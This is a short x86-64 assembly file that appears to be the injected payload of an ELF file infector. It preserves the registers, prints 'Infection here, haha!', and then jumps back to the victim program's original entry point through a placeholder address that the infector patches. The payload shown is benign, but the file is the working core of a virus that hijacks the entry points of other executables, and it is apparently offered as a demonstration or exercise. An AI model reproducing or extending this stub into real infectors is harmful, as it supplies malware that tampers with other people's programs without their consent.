%define SYS_WRITE 1

%macro print 2
    mov rax, SYS_WRITE
    mov rdi, 1
    lea rsi, [%1]
    mov rdx, %2
    syscall
%endmacro


section .text
    global _start

_start:
    push rax
    push rdi
    push rsi
    push rdx
    push rbx

    print rel message, message_end - message

    pop rbx
    pop rdx
    pop rsi
    pop rdi
    pop rax

    ; jump to original position in victim program
    lea rax, [rel _start]
    sub rax, 0x11111111 ; place, which infector replace by original entry address
    jmp rax


message db "Infection here, haha!", 0xa
message_end db 0x0
